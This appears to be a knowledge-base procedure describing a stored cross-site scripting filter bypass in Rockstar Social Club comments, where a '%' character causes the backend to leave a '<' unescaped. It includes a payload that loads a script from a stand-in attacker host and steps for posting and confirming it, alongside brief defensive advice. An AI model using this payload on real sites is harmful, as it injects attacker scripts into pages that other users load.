---
id: proc-rockstar-xss-bypass2-001
tags:
  - xss
  - filter-bypass
  - percentage-sign
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.364Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Bypass-Filter-with-Percentage-Sign-for-Unescaped-Tag

## Summary

This procedure bypasses backend filters in Rockstar Social Club comments post-fix by using a single '%' to cause malformed escaping, producing an unescaped '<' next to the escaped one for stored XSS injection.

## Description

After patching control character bypasses, the backend escaping logic mishandles '%', leading to outputs like '&lt;%<script...'. This allows script tags to partially render, enabling JS execution on comment views. Discovered through analysis of filter behaviors.

## Requirements

1. Access to updated Social Club comment interface
2. Browser for testing escaped output
3. Awareness of prior fix context

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to handle encoding artifacts like '%'
- Use strict HTML entity encoding without partial escapes
- Audit backend rendering for dual escaped/unescaped outputs

## Objectives

1. Force unescaped '<' via '%' confusion
2. Inject partial script tags
3. Trigger JS on comment rendering

## Instructions

### Step 1: Prepare Payload

**Context**: Insert '%' before escaped '<' to disrupt backend processing.

Use payload:

```
<%&lt;script src=//evil.com/xss.js?&gt;
```

> Post in comments; backend produces '&lt;%<script/src="//..." <="" p="">'.

### Step 2: Inspect and Confirm

**Context**: Check for unescaped '<' in the final HTML.

Load the comment page and examine source.

> Expected: Unescaped '<' allows tag injection, potentially loading external script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[filter-bypass]]
